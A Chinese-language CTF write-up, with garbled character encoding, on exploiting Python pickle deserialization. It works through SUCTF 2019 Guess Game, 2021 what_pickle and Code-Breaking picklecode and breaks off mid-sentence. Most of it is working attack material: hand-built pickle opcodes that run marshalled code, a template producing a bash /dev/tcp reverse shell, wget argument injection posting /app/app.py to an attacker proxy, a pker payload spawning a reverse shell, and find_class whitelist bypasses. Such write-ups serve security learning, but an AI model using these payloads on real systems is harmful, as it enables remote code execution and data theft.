print code_serialized # YwAAAAABAAAAAgAAAAMAAABzOwAAAGQBAGQAAGwAAH0AAIcAAGYBAGQCAIYAAIkAAGQDAEeIAABkBACDAQBHSHwAAGoBAGQFAIMBAAFkAABTKAYAAABOaf////9jAQAAAAEAAAAEAAAAEwAAAHMsAAAAfAAAZAEAawEAchAAfAAAU4gAAHwAAGQBABiDAQCIAAB8AABkAgAYgwEAF1MoAwAAAE5pAQAAAGkCAAAAKAAAAAAoAQAAAHQBAAAAbigBAAAAdAMAAABmaWIoAAAAAHMFAAAAdTIucHlSAQAAAAUAAABzBgAAAAABDAEEAXMIAAAAZmliKDEwKT1pCgAAAHMHAAAAL2Jpbi9zaCgCAAAAdAIAAABvc3QGAAAAc3lzdGVtKAEAAABSAgAAACgAAAAAKAEAAABSAQAAAHMFAAAAdTIucHl0AwAAAGZvbwMAAABzCAAAAAABDAEPBA8B ç°åœ¨å¾—åˆ°äº†åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å¸Œæœ›å®ƒè¢«ååºåˆ—åŒ–æ—¶æ‰§è¡Œï¼Œä½†æ˜¯ç›´æ¥å°†ä»–æ”¾å…¥__reduce__è¿”å›éƒ¨åˆ†ä¼¼ä¹å¹¶ä¸å¯ä»¥ï¼Œ__reduce__æ˜¯è°ƒç”¨callableæ¥æ‰§è¡Œå‚æ•°ä¹‹ç±»çš„ï¼Œè€Œæˆ‘ä»¬æ„é€ å¥½çš„æœ¬èº«å°±æ˜¯callableï¼Œå¸Œæœ›å®ƒæ‰§è¡Œè€Œä¸æ˜¯ä½œä¸ºå¦ä¸€ä¸ªcallableçš„å‚æ•°ï¼›è¿™æ—¶å°±éœ€è¦ç›´æ¥ä»PVMæ“ä½œç çš„å±‚çº§è¿›è¡Œæ„é€ äº†ã€‚\nâ€”â€”â€”â€”å…¶å®æˆ‘è§‰å¾—æ›´é€šä¿—çš„ç†è§£æ˜¯è¿™æ ·å¯ä»¥ä¸æŠŠè¦æ‰§è¡Œçš„ä»£ç é™åˆ¶åœ¨return (os.system,(a,))è¿™æ ·å¼çš„æ¡†æ¶ä¸­ï¼Œè€Œæ˜¯å¯ä»¥è‡ªç”±çš„æ‰§è¡Œä»£ç ï¼Œæˆ–è€…è¯´å°±æ˜¯å¦ä¸€ç§å½¢å¼çš„pker\næˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„å…¶å®æ˜¯ï¼ˆåˆ©ç”¨åˆ°python oopçš„ç‰¹æ€§ï¼Œé€šè¿‡types.FunctionTyle(func_code,globals(),â€™â€™)()æ¥åŠ¨æ€åœ°åˆ›å»ºåŒ¿åå‡½æ•°ï¼Œå‚è§ï¼šå®˜æ–¹æ–‡æ¡£ï¼‰\n(types.FunctionType(marshal.loads(base64.b64decode(code_enc)), globals(), \u0026#39;\u0026#39;))() æˆ–è€…æ›´å¯è¯»ä¸€äº›\ncode_str = base64.b64decode(code_enc) code = marshal.loads(code_str) func = types.FunctionType(code, globals(), \u0026#39;\u0026#39;) func() æ¥ä¸‹æ¥å°±æ˜¯æ‰‹åŠ¨æ„é€ opcodeçš„æ—¶å€™äº†ï¼Œå›æƒ³ä¹‹å‰è¿”å›ä¸€ä¸ªç®€å•çš„shellæ—¶çš„opcode\ncos system (S\u0026#39;/bin/sh\u0026#39; tR. å¼€å¤´çš„cåé¢è·Ÿçš„æ˜¯å¼•å…¥çš„æ¨¡å—ï¼Œæ¢è¡Œä¹‹åæ˜¯å‡½æ•°ï¼Œå†æ¢è¡Œä¹‹åæ˜¯æ‰§è¡Œçš„è¯­å¥ï¼›æ ¹æ®è¿™ä¸ªç»“æ„æŠŠmarshalå’Œb64åŠ è¿›å»\ncmarshal loads (cbase64 b64decode (S\u0026#39;YwAAAAAB........\u0026#39; tRtR è€Œglobals()å¯ä»¥åœ¨__builtin__æ¨¡å—ä¸­å¼•å…¥\n{}{} c__builtin__ globals (tR æŠŠä¸Šé¢çš„ç¼åˆèµ·æ¥å¾—åˆ°æœ€ç»ˆçš„payloadï¼Œæ³¨æ„æ·»åŠ (rR.\nctypes FunctionType (cmarshal loads (cbase64 b64decode (S\u0026#39;YwAAAAAB........\u0026#39; tRtRc__builtin__ globals (tRS\u0026#39;\u0026#39; tR(tR. æ„é€ è¿™ä¸ªäººçœ‹ç€è´¹åŠ²çš„payloadçš„æ¨¡æ¿~ï¼ˆæ¥æºå‚è§ï¼šArbitrary code execution with Python picklesï¼‰\n# py2 import marshal import base64 def foo(): pass # Your code here print \u0026#34;\u0026#34;\u0026#34;ctypes FunctionType (cmarshal loads (cbase64 b64decode (S\u0026#39;%s\u0026#39; tRtRc__builtin__ globals (tRS\u0026#39;\u0026#39; tR(tR.\u0026#34;\u0026#34;\u0026#34; % base64.b64encode(marshal.dumps(foo.func_code)) ç”¨pickleæ‰§è¡Œä¸€ä¸‹é‚£ä¸²payloadçœ‹çœ‹æ•ˆæœ\næˆåŠŸè¿”å›äº†æ–æ³¢é‚£å¥‘æ•°åˆ—çš„ç»“æœå’Œä¸€ä¸ªshell\nåŸç†éƒ½æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå¯ä»¥ç”¨Marshal+b64çš„æ–¹å¼åå¼¹shellï¼ˆç”¨æ¨¡æ¿ç”Ÿæˆopcode\nimport marshal import base64 def foo(): import os a = \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.31.29/8426 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; # print \u0026#39;hold on...\u0026#39; os.system(a) print \u0026#34;\u0026#34;\u0026#34;ctypes FunctionType (cmarshal loads (cbase64 b64decode (S\u0026#39;%s\u0026#39; tRtRc__builtin__ globals (tRS\u0026#39;\u0026#39; tR(tR.\u0026#34;\u0026#34;\u0026#34; % base64.b64encode(marshal.dumps(foo.func_code)) â€”â€”â€”â€”æˆ–è€…ä¸‹é¢è¿™ä¸ªæ¨¡æ¿ä¹Ÿå¯ä»¥è¾¾åˆ°ä¸Šé¢çš„æ•ˆæœï¼ˆæ‰§è¡Œä»£ç  è€Œä¸åŒ…å«ç±»å’Œå‡½æ•°ï¼‰ï¼ˆæ¥æºï¼špickle_compiler.py\ntry: import cPickle as pickle except ImportError: import pickle from sys import argv def picklecompiler(sourcefile): sourcecode = file(sourcefile).read() return \u0026#34;c__builtin__\\neval\\n(c__builtin__\\ncompile\\n(%sS\u0026#39;\u0026lt;payload\u0026gt;\u0026#39;\\nS\u0026#39;exec\u0026#39;\\ntRtR.\u0026#34; % (pickle.dumps( sourcecode )[:-4],) def usage(): print \u0026#39;\u0026#39;\u0026#39;usage: python %s filename\u0026#39;\u0026#39;\u0026#39; % argv[0] if __name__ == \u0026#34;__main__\u0026#34;: if len(argv) == 2: print picklecompiler(argv[1]) else: usage() å·¥å…·äºŒè¿ - é€šè¿‡pkeræ„é€ opcode åŸç†å‚è§ï¼šé€šè¿‡ASTæ¥æ„é€ Pickle opcode - è‡ªåŠ¨åŒ–æ„é€ ï¼Œåˆ©ç”¨äº†æŠ½è±¡è¯­æ³•æ ‘\npkerä¼šç”¨åˆ°GLOBAL, INST, OBJè¿™ä¸‰ç§ç‰¹æ®Šå‡½æ•°å’Œä¸€äº›å¿…è¦çš„è½¬æ¢æ–¹å¼ï¼›ä¸‹é¢æ˜¯pkerçš„ç®€å•å°æ —å­ï¼ˆæ›´å¤šä½¿ç”¨è¯´æ˜è¯¦è§ä¸Šé¢çš„é“¾æ¥ï¼‰\nå…¨å±€å˜é‡è¦†ç›–\n# è¦†ç›–ç›´æ¥ç”±æ‰§è¡Œæ–‡ä»¶å¼•å…¥secretæ¨¡å—ä¸­çš„nameå’Œcategoryæ¨¡å— ecret = GLOBAL(\u0026#39;__main__\u0026#39;, \u0026#39;secret\u0026#39;) secret.name = \u0026#39;1\u0026#39; secret.category = \u0026#39;2\u0026#39; # è¦†ç›–å¼•å…¥æ¨¡å—çš„å˜é‡ game = GLOBAL(\u0026#39;guess_game\u0026#39;, \u0026#39;game\u0026#39;) game.curr_ticket = \u0026#39;123\u0026#39; å‡½æ•°æ‰§è¡Œ\n# é€šè¿‡b\u0026#39;R\u0026#39;è°ƒç”¨ __reducce__æ–¹æ³• s = \u0026#39;whoami\u0026#39; system = GLOBAL(\u0026#39;os\u0026#39;, \u0026#39;system\u0026#39;) system(s) return # é€šè¿‡b\u0026#39;i\u0026#39;è°ƒç”¨ INST(\u0026#39;os\u0026#39;, \u0026#39;system\u0026#39;, \u0026#39;whoami\u0026#39;) # é€šè¿‡b\u0026#39;c\u0026#39;å’Œb\u0026#39;o\u0026#39;è°ƒç”¨ OBJ(GLOBAL(\u0026#39;os\u0026#39;, \u0026#39;system\u0026#39;), \u0026#39;whoami\u0026#39;) # å¤šå‚æ•°è°ƒç”¨å‡½æ•° INST(\u0026#39;[module]\u0026#39;, \u0026#39;[callable]\u0026#39;[, param0, param1...]) OBJ(GLOBAL(\u0026#39;[module]\u0026#39;, \u0026#39;[callable]\u0026#39;)[, param0, param1...]) å®ä¾‹åŒ–å¯¹è±¡ï¼ˆç‰¹æ®Šçš„å‡½æ•°æ‰§è¡Œï¼‰\nanimal = INST(\u0026#39;__main__\u0026#39;, \u0026#39;Animal\u0026#39;,\u0026#39;1\u0026#39;,\u0026#39;2\u0026#39;) return animal animal = OBJ(GLOBAL(\u0026#39;__main__\u0026#39;, \u0026#39;Animal\u0026#39;), \u0026#39;1\u0026#39;,\u0026#39;2\u0026#39;) return animal animal = INST(\u0026#39;__main__\u0026#39;, \u0026#39;Animal\u0026#39;) animal.name=\u0026#39;1\u0026#39; animal.category=\u0026#39;2\u0026#39; return animal å…ˆå¯¹é¢˜ç›®æœ‰å¤§æ¦‚æ€è·¯ï¼Œç„¶åè¾…ä»¥å·¥å…·~å¥½è€¶\nå·¥å…·äºŒè¿ - anapickle å…¶å®ä¸€ä¸ªå¹´é¾„å¾ˆå¤§çš„è„šæœ¬äº†ï¼Œæ”¯æŒpython2.3ã€‚ã€‚ã€‚ã€‚ä½†æ˜¯åŒ…å«äº†å¾ˆå¤špayloadï¼Œå¯ä»¥çµæ´»è¿ç”¨~\nbypass!!! å¯¹ç±»å‹çš„æ£€æŸ¥ å¯ä»¥åœ¨å·²ç»æ„é€ å¥½çš„opcodeåé¢å»æ‰.å†ç»­ä¸Šç›¸åº”çš„å¯¹è±¡çš„opcodeï¼Œä½œä¸ºæ ˆé¡¶çš„å€¼ä¾›æ£€æŸ¥\né™åˆ¶b'c'å¯¹æ¨¡å—çš„å¼•å…¥ - find_class()çš„é‡å†™ ä¿®æ”¹find_class()ä¼šå¼•å…¥å‡½æ•°\u0026amp;æ¨¡å—çš„ç™½åå•ï¼Œä¸€å®šç¨‹åº¦ä¸Šè§£å†³pickleçš„å®‰å…¨æ€§é—®é¢˜ï¼›ä»¥ä¸‹ä¸¤ç§æƒ…å†µä¼šè°ƒç”¨find_class()çš„æ£€æŸ¥ï¼š\nopcodeè§’åº¦ï¼šå‡ºç°c, i, b'\\x93'ä¼šè°ƒç”¨ pythonè§’åº¦ï¼šfind_class()åªä¼šåœ¨è§£æopcodeæ—¶è°ƒç”¨ä¸€æ¬¡ï¼Œåªè¦ç»•è¿‡opcodeçš„æ‰§è¡Œè¿‡ç¨‹ï¼Œä¹‹åå†äº§ç”Ÿçš„å‡½æ•°åœ¨é»‘åå•ä¸­ä¹Ÿä¸ä¼šæ‹¦æˆªï¼ˆæ¯”å¦‚é€šè¿‡__import__æ¥ç»•è¿‡ï¼‰ \u0026ndash;\u0026raquo;ä»…å¯ä»¥å¼•å…¥__main__å¼€å¤´çš„æ¨¡å— â€œé€šè¿‡GLOBALæŒ‡ä»¤å¼•å…¥çš„å˜é‡å¯ä»¥çœ‹ä½œæ˜¯åŸå˜é‡çš„å¼•ç”¨ï¼Œæˆ‘ä»¬åœ¨æ ˆä¸Šä¿®æ”¹å®ƒçš„å€¼ï¼Œä¹Ÿä¼šä¿®æ”¹åŸå˜é‡â€ï¼ŒåŸºäºè¿™ä¸€åŸç†ï¼Œå½“cæŒ‡ä»¤åªå…è®¸__main__æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å¼•å…¥__main__.blueï¼ˆblueè§é¢˜è¡Œäº‹ ä¸Šä¸‹æ–‡ä¸­ä¼šæå‰å¼•å…¥ï¼‰è¿™ä¸ªmoduleï¼Œå†å°†ä¸€ä¸ªdictå‹å…¥æ ˆï¼Œå†…å®¹æ˜¯{'name': 'rua', 'grade': 'www'}ï¼›ä¹‹åæ‰§è¡ŒBUILDæŒ‡ä»¤ï¼Œå°†ä¼šæ”¹å†™__main__.blue.nameå’Œ __main__.blue.gradeï¼Œæ­¤æ—¶å·²ç»æ‰§è¡Œäº†æˆ‘ä»¬æƒ³è¦çš„å˜é‡è¦†ç›–ã€‚ä¹‹åå¼¹æ‰æ ˆé¡¶ï¼Œç°åœ¨ä¸ºç©ºæ ˆï¼Œæ‹¼æ¥ä¸Šæ­£å¸¸çš„Studentå¯¹è±¡åºåˆ—åŒ–åçš„opcodeã€‚æ­¤æ—¶çš„å®Œæ•´opcodeåœ¨è¢«ååºåˆ—åŒ–æ—¶ï¼Œæ ˆé¡¶æ˜¯æ­£å¸¸çš„Studentå¯¹è±¡ï¼Œè€Œè¢«æ‰§è¡Œæ—¶å´ä¼šå…ˆæ‰§è¡Œä¸€éå‰é¢çš„è¿‡ç¨‹ï¼Œé€ æˆå˜é‡è¦†ç›–ã€‚\næ—¢ç„¶æˆ‘ä»¬å¯ä»¥åšåˆ°é‡å†™å˜é‡çš„å€¼ï¼Œé‚£ä¹Ÿå¯ä»¥å°†è¿™ä¸ªå€¼æ”¹ä¸ºread wrapperçš„è¿”å›å€¼åšåˆ°ä»»æ„æ–‡ä»¶è¯»å–ï¼ˆè¯¦è§åé¢çš„å†…å®¹ï¼‰\n\u0026ndash;\u0026raquo;ä»…å¯ä»¥å¼•å…¥é¢˜ç›®ä¸­è‡ªè®¾çš„æ¨¡å—\u0026amp;æ¨¡å—åä¸èƒ½æœ‰__ç¬¦ æ —å­2 - [SUCTF 2019]Guess Game æœ¬åœ°å¤ç°è¿˜æ˜¯å¤±è´¥ï¼Œæ— è§£ï¼Œdockeråœ°å€-\u0026gt;https://github.com/rmb122/suctf2019_guess_game\næ˜¯ä¸ªçŒœæ•°æ¸¸æˆï¼Œäº¤äº’é€»è¾‘åœ¨init.py, Game.pyå’ŒTicket.pyä¸­ï¼Œ10ä»¥å†…çš„æ•°å­—éœ€è¦çŒœå¯¹10æ¬¡ï¼ˆå…¨èƒœï¼‰æ‰ä¼šè¿”å›flag\nç„¶åæ˜¯game_client.py\næ¥æ”¶æ•°å­—çš„è¾“å…¥ä½œä¸ºå‚æ•°ç”ŸæˆTicketå¯¹è±¡ï¼Œåºåˆ—åŒ–åå‘é€åˆ°serverç«¯\nå†çœ‹game_server.pyï¼Œç”¨äº†é‡å†™äº†çš„find_class()\nè¿™ä¸ªé™åˆ¶çš„æ„æ€æ˜¯å¯¼å…¥çš„æ¨¡å—åªèƒ½ä»¥guess_nameå¼€å¤´å¹¶ä¸”åå­—é‡Œæ²¡æœ‰__\nå¤§æ¦‚çœ‹å®Œäº†æµç¨‹ï¼Œæ¥ä¸‹æ¥æ‰¾æ‰¾çªç ´å£â€”â€”åºåˆ—åŒ–æ—¶æ˜¯ç”Ÿæˆä¸€ä¸ªTicketçš„å®ä¾‹\nåˆ¤æ–­è¾“èµ¢åˆ™æ˜¯éœ€è¦Gameè¾…åŠ©\nç»“åˆgame_server.pyçš„åˆ¤æ–­æ¡ä»¶ï¼Œæ‹¿åˆ°flagéœ€è¦self.win_count == max_round == 10\né‚£ä¹ˆæ„é€ çš„æ–¹å‘æœ‰äº†â€”â€”ä¿®æ”¹ç›¸å…³å‚æ•°åšåˆ°å˜é‡è¦†ç›–ï¼Œå†ä»¥åºåˆ—åŒ–çš„opcodeå½¢å¼ä¼ è¿‡å»ã€‚æ‰‹å†™opcodeé¢ä¸´çš„é—®é¢˜å°±æ˜¯é‡å†™find_class()åå¯¹åŠ è½½æŒ‡å®šæ¨¡å—çš„é™åˆ¶ï¼Œè€Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°__init__.pyä¸­game = Game()ï¼Œæ‰€ä»¥ç›´æ¥å¯ä»¥é€šè¿‡guess_game.gameå¼•å…¥Game()ç±»ï¼Œç„¶åä¿®æ”¹ç±»ä¸­çš„win_countå’Œround_countå°±èƒ½åšåˆ°å˜é‡è¦†ç›–ï¼›ç¬¬äºŒè¦æ³¨æ„å¿…é¡»æ‰‹å†™opcodeï¼Œå¦‚æœæ˜¯å…ˆfrom guess_name import gameï¼Œç„¶åä¿®æ”¹å‚æ•°åå†dumpï¼Œåˆ™æ˜¯åœ¨è¿è¡Œæ—¶é‡æ–°æ–°å»ºä¸€ä¸ªGameå¯¹è±¡ï¼Œå°±ä¸æ˜¯ä»guess_gameè¿™ä¸ªmoduleä¸­è·å–ï¼Œç ´åä¸Šä¸‹æ–‡ï¼›ç¬¬ä¸‰è¦æ³¨æ„\npickleåºåˆ—åŒ–æµæ‰§è¡Œå®Œä¼šæŠŠæ ˆé¡¶çš„å€¼è¿”å›ï¼Œæ‰€ä»¥æ ˆé¡¶éœ€è¦è®¾ä¸ºTicketï¼Œè¿™é‡Œå¯ä»¥dumpsä¸€ä¸ªTicketï¼Œç„¶åæ‹¼åˆ°ä¹‹å‰æ‰‹å†™çš„opcodeä¹‹å\nopcodes:\n# ä¿®æ”¹win_count = 10å’Œround_count = 9ï¼Œä¼ è¿‡å»ä¹‹åæ‰§è¡Œä¸€æ¬¡round_count += 1å°±èƒ½å…¨èƒœ cguess_name game }S\u0026#34;win_count\u0026#34; I10 sS\u0026#34;round_count\u0026#34; I9 sbcguess_game.Ticket\\nTicket\\nq\\x00)\\x81q\\x01}q\\x02X\\x06\\x00\\x00\\x00numberq\\x03K\\x06sb. # cä¹‹åæ˜¯è¢«find_class()ç›‘æ§çš„åŒºåŸŸï¼Œæ‹¼æ¥Ticket import socket import struct s = socket.socket() s.connect((\u0026#39;node4.buuoj.cn\u0026#39;, 28803)) exp = b\u0026#39;\u0026#39;\u0026#39;cguess_game game }S\u0026#34;win_count\u0026#34; I10 sS\u0026#34;round_count\u0026#34; I9 sbcguess_game.Ticket\\nTicket\\nq\\x00)\\x81q\\x01}q\\x02X\\x06\\x00\\x00\\x00numberq\\x03K\\x06sb.\u0026#39;\u0026#39;\u0026#39; s.send(struct.pack(\u0026#39;\u0026gt;I\u0026#39;, len(exp))) s.send(exp) print(s.recv(1024)) print(s.recv(1024)) print(s.recv(1024)) print(s.recv(1024)) â€”â€”â€”â€”ç”¨pker\nticket = INST(\u0026#39;guess_game.Ticket\u0026#39;, \u0026#39;Ticket\u0026#39;, 0) game = GLOBAL(\u0026#39;guess_game\u0026#39;, \u0026#39;game\u0026#39;) game.curr_ticket = ticket return ticket # b\u0026#34;(I0\\niguess_game.Ticket\\nTicket\\np0\\n0cguess_game\\ngame\\np1\\n0g1\\n(N(S\u0026#39;curr_ticket\u0026#39;\\ng0\\ndtbg0\\n.\u0026#34; æ —å­3 - [å·…å³°æå®¢ 2021]what_pickle ç™»å½•é¡µé¢ ä»»æ„å¯†ç å‡å¯ç™»å…¥ï¼Œä»…æ˜¾ç¤ºä¸€å¼ å›¾ç‰‡+ç™»å½•æ—¶è¾“å…¥çš„å¯†ç ï¼›å›¾ç‰‡çš„urlä¸º/images?image=2.jpgï¼Œä½†æ˜¯ä¸èƒ½å¸¸è§„çš„ç›®å½•ç©¿è¶Šæ‹¿æºç ï¼Œå½“æ—¶åšçš„æ—¶å€™å°±ä¸ä¼šäº†ï¼Œä¸‹é¢æ˜¯å¤ç°\n/imageså¯ä»¥çœ‹åˆ°å¼€ç€çš„debugç•Œé¢\nèƒ½çœ‹åˆ°éƒ¨åˆ†çš„æºç ï¼Œè¿™é‡Œçš„å›¾ç‰‡æ˜¯ç”¨çš„wgetå‘½ä»¤æ¥ä¸‹è½½æœ¬åœ°8080ç«¯å£çš„/imageå›¾ç‰‡ï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•wgetå‘½ä»¤æ³¨å…¥å°†æ–‡ä»¶å¤–å¸¦å‡ºæ¥\n/images?image=\u0026amp;argv=--post-file=/app/app.py\u0026amp;argv=--execute=http_proxy=http://ip:port /images?image=\u0026amp;argv=â€”post-file=/app/app.py\u0026amp;argv=-e http_proxy=http://ip:port ä¾æ¬¡è¯»å‡º/app/app.pyå’Œ/app/config.py\n# app.py from flask import Flask, request, session, render_template, url_for,redirect import pickle import io import sys import base64 import random import subprocess from ctypes import cdll from config import SECRET_KEY, notadmin,user cdll.LoadLibrary(\u0026#34;./readflag.so\u0026#34;) app = Flask(__name__) app.config.update(dict( SECRET_KEY=SECRET_KEY, )) class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module in [\u0026#39;config\u0026#39;] and \u0026#34;__\u0026#34; not in name: return getattr(sys.modules[module], name) raise pickle.UnpicklingError(\u0026#34;global \u0026#39;%s.%s\u0026#39; is forbidden\u0026#34; % (module, name)) def restricted_loads(s): \u0026#34;\u0026#34;\u0026#34;Helper function analogous to pickle.loads().\u0026#34;\u0026#34;\u0026#34; return RestrictedUnpickler(io.BytesIO(s)).load() @app.route(\u0026#39;/\u0026#39;) @app.route(\u0026#39;/index\u0026#39;) def index(): if session.get(\u0026#39;username\u0026#39;, None): return redirect(url_for(\u0026#39;home\u0026#39;)) else: return render_template(\u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#34;POST\u0026#34;]) def login(): name = request.form.get(\u0026#39;username\u0026#39;, \u0026#39;\u0026#39;) data = request.form.get(\u0026#39;data\u0026#39;, \u0026#39;test\u0026#39;) User = user(name,data) session[\u0026#34;info\u0026#34;]=base64.b64encode(pickle.dumps(User)) return redirect(url_for(\u0026#39;home\u0026#39;)) @app.route(\u0026#39;/home\u0026#39;) def home(): info = session[\u0026#34;info\u0026#34;] User = restricted_loads(base64.b64decode(info)) Jpg_id = random.randint(1,5) return render_template(\u0026#39;home.html\u0026#39;,id = str(Jpg_id), info = User.data) @app.route(\u0026#39;/images\u0026#39;) def images(): command=[\u0026#34;wget\u0026#34;] argv=request.args.getlist(\u0026#39;argv\u0026#39;) true_argv=[x if x.startswith(\u0026#34;-\u0026#34;) else \u0026#39;--\u0026#39;+x for x in argv] image=request.args[\u0026#39;image\u0026#39;] command.extend(true_argv) command.extend([\u0026#34;-q\u0026#34;,\u0026#34;-O\u0026#34;,\u0026#34;-\u0026#34;]) command.append(\u0026#34;http://127.0.0.1:8080/\u0026#34;+image) image_data = subprocess.run(command,stdout=subprocess.PIPE,stderr=subprocess.PIPE) return image_data.stdout if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, debug=True, port=80) # config.py SECRET_KEY=\u0026#34;On_You_fffffinddddd_thi3_kkkkkkeeEEy\u0026#34; notadmin={\u0026#34;admin\u0026#34;:\u0026#34;no\u0026#34;} class user(): def __init__(self, username, data): self.username = username self.data = data def backdoor(cmd): if isinstance(cmd,list) and notadmin[\u0026#34;admin\u0026#34;]==\u0026#34;yes\u0026#34;: s=\u0026#39;\u0026#39;.join(cmd) eval(s) è¿™é‡Œçš„é™åˆ¶æŒºç®€å•çš„äº†ï¼Œè¦†ç›–ä¸€ä¸ªnotadminå­—å…¸adminé”®çš„å€¼ä¸ºyeså³å¯æ‰§è¡Œç»™å‡ºçš„åé—¨å‡½æ•°eval()\n# ç”¨pker.pyç”Ÿæˆpayload s=GLOBAL(\u0026#34;config\u0026#34;,\u0026#34;notadmin\u0026#34;) s[\u0026#34;admin\u0026#34;]=\u0026#34;yes\u0026#34; user=INST(\u0026#34;config\u0026#34;,\u0026#34;user\u0026#34;) user.username=\u0026#34;tyskill\u0026#34; user.data=\u0026#34;tyskill\u0026#34; door=INST(\u0026#34;config\u0026#34;,\u0026#34;backdoor\u0026#34;,[\u0026#34;__import__(\u0026#39;subprocess\u0026#39;).call(\\\u0026#34;echo -e \u0026#39;#!/bin/bash\\\\nsh -i \u0026gt;\u0026amp; /dev/tcp/you_vps_ip/port 0\u0026gt;\u0026amp;1\u0026#39;\u0026gt;x \u0026amp;\u0026amp; bash x \u0026amp;\u0026amp; rm -rf x\\\u0026#34;,shell=True)\u0026#34;]) return user ç„¶åbase64.b64encode(data)åŠ è¿›session['info']ä¸­æ‹¿åˆ°shell\nçœ‹wpï¼Œåé¢çš„æ­¥éª¤å¥½åƒè¿˜è·Ÿpwnæœ‰ç‚¹å…³ç³»ï¼Œæˆ‘å¯¹pwnæ¯«æ— ç ”ç©¶ï¼Œä¸çŒ®ä¸‘äº†ï¼ŒæŒ‡è·¯ä¸¤ä¸ªwp-\u0026gt;wp1 | wp2\n\u0026ndash;\u0026raquo;ä»…å¯ä»¥å¼•å…¥builtinsæ¨¡å— æ›´å¤šçŸ¥è¯†å‚è€ƒï¼šæ·±å…¥ç†è§£Pythonä¸­çš„__builtin__å’Œ__builtins__ | [Python çš„å†…å»ºå¯¹è±¡](https://www.jianshu.com/p/645e973 83c1f) | __builtins__ ä¸ __builtin__ï¼ˆbuiltinsï¼‰\næ —å­4 - [Code-Breaking 2018] picklecode æœ¬åœ°å¤ç°è¿˜æ˜¯å¤±è´¥ï¼Œdockeråœ°å€-\u0026gt;https://github.com/phith0n/code-breaking/tree/master/2018/picklecodeï¼ˆå°±è·Ÿè¢«dockerè¯…å’’äº†ä¸€æ · ä»æ¥æ²¡æœ‰æˆåŠŸçš„ç”¨dockerå¤ç°è¿‡ä¸€é“é¢˜ğŸ˜­ğŸ˜­ğŸ˜­çœŸå°±è„‘è¡¥å‡ºflagäº†\nå®¡è®¡æºç ï¼Œæ˜¯ä¸€ä¸ªdjangoçš„é¡¹ç›®ï¼ˆæ­£å¥½ä¹‹å‰çš„å®è®­åšçš„å°±æ˜¯djangoçš„é¡¹ç›®ï¼Œçœ‹æºç è½»æ¾ä¸€äº›ï¼‰ï¼Œä¸»æ–‡ä»¶å¤¹æ˜¯coreï¼Œæœ‰ä¸€ä¸ªåä¸ºchallengeçš„app\nçœ‹coreä¸‹çš„settings.pyæ¯”é»˜è®¤çš„é…ç½®å¤šäº†54å’Œ55è¡Œ\nç”¨äº†ç‰¹æ®Šçš„SESSION_ENGINEå’ŒSESSION_SERIALIZERï¼Œå‰è€…æŒ‡çš„æ˜¯djangoå°†ç”¨æˆ·è®¤è¯ä¿¡æ¯å­˜å‚¨åœ¨å“ªé‡Œ åè€…æŒ‡djangoç”¨ä»€ä¹ˆæ–¹å¼å­˜å‚¨è®¤è¯ä¿¡æ¯ï¼Œä¹Ÿå°±ç›¸å½“äºå…ˆç»è¿‡SESSION_SERIAZLIZERæŒ‡å®šçš„æ–¹å¼è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œå†æœ‰SESSION_ENGINEæŒ‡å®šçš„æ–¹å¼å­˜å‚¨åˆ°æŸä¸ªåœ°æ–¹ã€‚é»˜è®¤çš„djangoé¡¹ç›®ä¸­ï¼Œå­˜å‚¨ä½ç½®åº”è¯¥æ˜¯django.contrib.sessions.backends.dbï¼Œåºåˆ—åŒ–æ–¹å¼åº”è¯¥æ˜¯django.contrib.sessions.serializers.JSONSerializerï¼›è€Œè¿™é‡Œå°±æ˜¯ç”¨pickleåºåˆ—åŒ–åçš„å½¢å¼ï¼ŒåŠ ç­¾åsingedåå­˜å‚¨åœ¨cookieä¸­ã€‚é‚£è¿™é‡Œè‚¯å®šè¦æ§åˆ¶sessionï¼Œç»“åˆpickleæ¥rceäº†ï¼›è·Ÿè¿‡å»çœ‹çœ‹\nä¾æ—§æ˜¯é‡å†™äº†find_class()æ–¹æ³•ï¼Œåªæœ‰æ¨¡å—æ˜¯å†…ç½®çš„builtinsï¼ˆä¸éœ€è¦importå°±å¯ä»¥ç”¨çš„ï¼‰å¹¶ä¸”åå­—ä¸èƒ½åœ¨é»‘åå•ä¸­æ‰å¯ä»¥ï¼›è¿™é‡Œçš„ç»•è¿‡æ˜¯ç¬¬äºŒä¸ªè€ƒç‚¹äº†ï¼Œå…ˆç¿»å›å»çœ‹ä¸€ä¸‹ä»…æœ‰çš„appçš„views.py\næ¨¡æ¿éƒ¨åˆ†ç›´æ¥æ‹¼æ¥äº†request.user.usernameï¼Œè¿™æ˜¯æ³¨å†Œæ—¶ä¼ å…¥ï¼Œæœ‰æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼Œæ‰¾æ‰¾è°ƒç”¨é“¾\nï¼ˆå› ä¸ºæœ¬åœ°ç¯å¢ƒå¤ªåƒåœ¾äº† æ²¡å¤ç° è¿™é‡Œäº‘åšé¢˜äº†ï¼‰åœ¨æ¨¡æ¿å¤„ä¸‹æ–­ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°å¾ˆå¤šçš„ä¸Šä¸‹æ–‡å˜é‡ï¼Œé€šå¸¸ä¼šå­˜åœ¨çš„æœ‰request, user, permsï¼Œè¿™é‡Œç”¨çš„åˆ©ç”¨é“¾æ˜¯ï¼ˆæ³¨æ„djangoæ¨¡æ¿å¼•æ“æ— 